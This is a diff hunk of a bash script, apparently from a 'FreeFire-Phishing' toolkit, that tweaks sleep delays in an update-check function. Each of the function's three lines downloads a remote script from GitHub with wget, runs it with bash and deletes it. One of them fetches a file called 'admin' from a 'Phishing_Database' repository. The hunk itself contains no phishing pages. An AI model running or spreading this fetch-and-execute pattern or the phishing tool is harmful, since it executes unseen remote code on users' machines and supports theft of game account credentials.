@@ -1037,13 +1037,12 @@ echo "";
 
 check_update () {
 echo ""
-echo -ne "\e[33m Chack Lates Version : " && sleep 1 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/ChackVersion-2.8 > /dev/null && bash ChackVersion-2.8 && rm -rf ChackVersion-2.8
+echo -ne "\e[33m Chack Lates Version : " && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/ChackVersion-2.8 > /dev/null && bash ChackVersion-2.8 && rm -rf ChackVersion-2.8
 echo ""
-echo -ne "\e[33m Checking Update : " && sleep 2 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/CheckingUpdate-2.8 > /dev/null && bash CheckingUpdate-2.8 && rm -rf CheckingUpdate-2.8
+echo -ne "\e[33m Checking Update : " && sleep 1 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/CheckingUpdate-2.8 > /dev/null && bash CheckingUpdate-2.8 && rm -rf CheckingUpdate-2.8
 echo ""
-echo -ne "\e[33m Admin Permission : " && sleep 1 && wget -q https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Phishing/FreeFire/admin > /dev/null && bash admin && rm -rf admin
+echo -ne "\e[33m Admin Permission : " && wget -q https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Phishing/FreeFire/admin > /dev/null && bash admin && rm -rf admin
 echo ""
-sleep 1
 }
 
 clear
